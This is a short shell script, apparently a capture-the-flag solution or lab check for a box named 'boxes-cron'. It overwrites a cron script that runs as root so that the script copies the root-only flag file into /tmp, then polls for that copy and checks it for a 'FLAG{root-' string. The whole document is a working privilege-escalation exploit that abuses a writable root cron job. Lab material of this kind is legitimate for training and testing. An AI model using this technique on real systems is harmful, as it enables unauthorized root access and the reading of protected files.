set -eu
rm -f /tmp/boxes-cron-root
cat > /opt/boxes-cron/run.sh <<'EOF'
#!/bin/sh
cat /root/root.txt > /tmp/boxes-cron-root
EOF
for _ in 1 2 3 4 5 6 7 8 9 10; do
    [ -s /tmp/boxes-cron-root ] && break
    sleep 1
done
out=$(cat /tmp/boxes-cron-root 2>/dev/null || true)
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "cron job did not run as root" >&2; exit 1; }
